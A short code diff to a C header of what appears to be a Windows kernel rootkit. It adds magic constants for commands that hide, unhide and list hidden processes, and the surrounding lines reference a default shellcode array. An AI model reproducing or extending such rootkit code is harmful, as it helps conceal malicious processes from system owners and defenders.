@@ -29,6 +29,11 @@ CONST BYTE DEFAULT_SHELLCODE[] = { 0x49, 0xbd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0
 #define UNHIDE_PROCESS STATUS_INVALID_NETWORK_RESPONSE  // Code used by client/medium for unhiding process
 #define HIDE_PROCESS STATUS_VIRTUAL_CIRCUIT_CLOSED  // Code used by client/medium for hiding process
 #define SHOWHIDDEN_PROCESS STATUS_INTERNAL_DB_CORRUPTION  // Code used by client/medium for listing hidden processes
+#define REMOVE_BY_INDEX_PID 0xFCFCFCCFCFCFDB  // Value of PID when asking to remove by index and not by PID
+#define UnhideProcess 0xC0C0C0C00C0C0C0C
+#define HideProcess 0xCDCDCDCDDCDCDCDC
+#define ListHiddenProcesses 0x0D0D0D0DD0D0D0D0
+
 
 typedef struct _KAFFINITY_EX {
 	char Affinity[0xA8];
